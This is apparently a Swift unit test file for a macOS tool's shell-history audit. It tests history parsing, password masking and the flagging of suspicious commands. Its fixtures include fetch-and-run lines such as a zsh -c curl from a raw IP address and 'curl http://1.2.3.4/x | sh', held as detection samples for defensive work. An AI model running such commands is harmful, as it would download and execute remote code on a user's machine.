import Foundation
import Testing
@testable import MacCleanerKit

@Suite("Shell history audit")
struct ShellHistoryAuditTests {
    let file = URL(filePath: "/Users/alice/.zsh_history")

    @Test func parsesZshExtendedFormatWithMultilineCommands() {
        let text = """
        : 1731974400:0;brew update
        : 1731974460:2;for f in *; do\\
        echo $f\\
        done
        : 1731974500:0;ls
        """
        let entries = ShellHistoryAudit.parse(text)
        #expect(entries.count == 3)
        #expect(entries[0] == ShellHistoryEntry(date: Date(timeIntervalSince1970: 1_731_974_400), command: "brew update"))
        #expect(entries[1].command.contains("echo $f"))
        #expect(entries[2].command == "ls")
    }

    @Test func parsesBashTimestampsAndPlainLines() {
        let entries = ShellHistoryAudit.parse("#1700000000\ngit status\nnpm test\n")
        #expect(entries.count == 2)
        #expect(entries[0].date == Date(timeIntervalSince1970: 1_700_000_000))
        #expect(entries[1].date == nil)
    }

    @Test func findsClickFixCommandWithDate() {
        let text = """
        : 1731974400:0;npm i
        : 1731974460:0;/bin/zsh -c "$(curl -fsSL http://193.0.0.1/update)"
        : 1731974470:0;git clone https://github.com/a/b
        """
        let hits = ShellHistoryAudit.audit(text: text, file: file)
        #expect(hits.count == 1)
        #expect(hits[0].date == Date(timeIntervalSince1970: 1_731_974_460))
        #expect(hits[0].severity == .high)
        #expect(hits[0].findings.first?.rule == .remoteScriptToShell)
        let advisory = ThreatAdvisory(historyHit: hits[0])
        #expect(advisory.kind == .shellHistory)
        #expect(advisory.rule == .remoteScriptToShell)
    }

    @Test func masksPasswordsInReportedCommand() {
        let hits = ShellHistoryAudit.audit(text: ": 1:0;dscl . -authonly bob Sup3rSecret!", file: file)
        #expect(hits.count == 1)
        #expect(!hits[0].command.contains("Sup3rSecret"))
    }

    @Test func repeatedCommandReportedOnceWithLatestDate() {
        let text = ": 100:0;curl http://1.2.3.4/x | sh\n: 200:0;curl http://1.2.3.4/x | sh\n"
        let hits = ShellHistoryAudit.audit(text: text, file: file)
        #expect(hits.count == 1)
        #expect(hits[0].date == Date(timeIntervalSince1970: 200))
    }

    @Test func developerHistoryHasNoHits() {
        let text = """
        : 1:0;brew install node
        : 2:0;/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
        : 3:0;pnpm dlx create-next-app
        : 4:0;docker run --rm -it alpine sh
        : 5:0;curl -fsSL https://get.pnpm.io/install.sh | sh -
        : 6:0;codex exec 'fix tests'
        """
        #expect(ShellHistoryAudit.audit(text: text, file: file).isEmpty)
    }

    @Test func tailStartsAtLineBoundaryAndUnmetafies() {
        let data = Data("first line\nsecond line\nthird\n".utf8)
        let tail = ShellHistoryAudit.tail(data, maxBytes: 15)
        #expect(String(decoding: tail, as: UTF8.self) == "third\n")
        // "é" = C3 A9; zsh metafies A9 (> 0x83) as 0x83, 0xA9 ^ 0x20
        let metafied = Data([0x65, 0x63, 0x68, 0x6F, 0x20, 0xC3, 0x83, 0xA9 ^ 0x20])
        #expect(ShellHistoryAudit.decode(metafied) == "echo é")
    }
}
